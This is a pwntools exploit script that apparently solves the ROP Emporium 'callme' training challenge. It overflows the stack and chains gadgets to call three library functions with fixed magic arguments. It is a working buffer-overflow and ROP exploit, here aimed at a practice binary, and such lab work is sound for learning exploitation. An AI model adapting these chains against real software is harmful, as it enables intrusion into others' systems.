from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./callme', checksec=False)

p = process("./callme")

#gdb.attach(p, gdbscript='''''')

ret = ROP(elf).find_gadget(["ret"])[0]
pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
push_rbp = 0x0000000000400840
#system = elf.sym['system']
rdi_rsi_rdx_ret = elf.sym['usefulGadgets']
vuln = elf.sym['usefulFunction']

call1 = elf.sym['callme_one']
call2 = elf.sym['callme_two']
call3 = elf.sym['callme_three']

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

payload = flat(
    cyclic(0x28),
    push_rbp,
    rdi_rsi_rdx_ret,
    arg1,
    arg2,
    arg3,
    call1,
    
    rdi_rsi_rdx_ret,
    arg1,
    arg2,
    arg3,
    call2,
    
    rdi_rsi_rdx_ret,
    arg1,
    arg2,
    arg3,
    call3
    
    
    
    )
p.sendlineafter(b">",payload)
p.interactive()
